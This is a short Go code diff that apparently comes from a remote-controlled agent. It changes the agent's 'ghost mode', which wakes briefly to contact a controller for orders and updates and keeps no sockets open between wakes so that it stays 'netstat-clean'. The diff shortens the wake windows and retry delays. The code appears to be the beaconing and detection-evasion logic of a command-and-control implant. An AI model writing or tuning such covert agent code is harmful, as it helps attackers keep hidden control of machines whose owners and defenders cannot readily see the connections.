@@ -2059,12 +2059,10 @@ func main() {
 		}
 	}
 
-	// Ghost mode: ~60s wake windows every ~2min (frequent enough that
-	// set-mode from the controller lands within 2min). Between wakes there
-	// are no sockets at all (netstat-clean); orders and updates land on the
-	// next wake. Short sessions mean failure: retry in a minute.
+	// Ghost mode: ~45s wake windows every ~75s (netstat-clean between
+	// wakes; set-mode lands within 30s). Short sessions retry faster.
 	if agentMode == commands.ModeGhost {
-		log.Printf("[*] ghost mode: 60s windows every ~2min (checks for mode changes)")
+		log.Printf("[*] ghost mode: 45s windows every ~75s (checks for mode changes)")
 		for {
 			select {
 			case <-ag.closing:
@@ -2072,15 +2070,15 @@ func main() {
 			default:
 			}
 			start := time.Now()
-			ag.ghostEnd = time.After(60 * time.Second)
+			ag.ghostEnd = time.After(45 * time.Second)
 			_ = ag.connectOnce()
 			ag.ghostEnd = nil
 			ag.conn = nil
 			ag.enc = nil
 			if time.Since(start) < 10*time.Second {
-				ag.setQuietSilent(1 * time.Minute)
+				ag.setQuietSilent(30 * time.Second)
 			} else {
-				ag.setQuietSilent(90 * time.Second)
+				ag.setQuietSilent(30 * time.Second)
 			}
 			if !waitQuiet() {
 				return
